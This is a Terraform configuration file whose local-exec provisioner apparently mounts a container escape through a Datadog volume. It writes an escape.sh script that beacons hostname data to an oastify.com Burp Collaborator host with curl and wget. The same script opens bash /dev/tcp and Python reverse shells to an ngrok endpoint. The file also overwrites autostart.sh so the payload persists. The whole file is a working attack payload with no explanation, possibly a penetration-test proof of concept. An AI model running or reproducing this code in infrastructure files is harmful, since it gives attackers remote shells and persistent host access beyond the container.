# main.tf - Container Escape via Datadog Mount
resource "null_resource" "container_escape" {
  provisioner "local-exec" {
    command = <<EOT
      # Debug: Show current state before we start
      echo "=== DEBUG: Current state ==="
      ls -la /var/datadog/
      mount | grep datadog
      echo "============================"
      
      # Write escape payload to Datadog mount
      cat > /var/datadog/escape.sh << 'EOF'
      #!/bin/sh
      echo "ESCAPE_SCRIPT_EXECUTED" > /tmp/escape_debug.log
      echo "Hostname: $(hostname)" >> /tmp/escape_debug.log
      echo "User: $(whoami)" >> /tmp/escape_debug.log
      ls -la / >> /tmp/escape_debug.log 2>&1
      
      # Prove execution to Burp Collaborator
      curl -s "http://vqpd77dwov67paogbsxfladvbmhd54tt.oastify.com/escape_$(hostname)" 2>/dev/null
      wget -q -O- "http://vqpd77dwov67paogbsxfladvbmhd54tt.oastify.com/wget_$(hostname)" 2>/dev/null
      
      # Connect reverse shell to ngrok
      echo "Attempting reverse shell..." >> /tmp/escape_debug.log
      bash -c 'bash -i >& /dev/tcp/6.tcp.eu.ngrok.io/19850 0>&1' &
      python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("6.tcp.eu.ngrok.io",19850));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")' &
      EOF
      chmod +x /var/datadog/escape.sh
      
      # Also update autostart.sh for persistence
      cat > /var/datadog/autostart.sh << 'EOF2'
      #!/bin/sh
      echo "AUTOSTART_EXECUTED" > /tmp/autostart_debug.log
      /var/datadog/escape.sh
      EOF2
      chmod +x /var/datadog/autostart.sh
      
      # Debug: Show what we deployed
      echo "=== DEBUG: After deployment ==="
      ls -la /var/datadog/
      cat /var/datadog/escape.sh
      echo "==============================="
      
      echo "Container escape payload deployed. Check /tmp/escape_debug.log if scripts run."
    EOT
  }
}
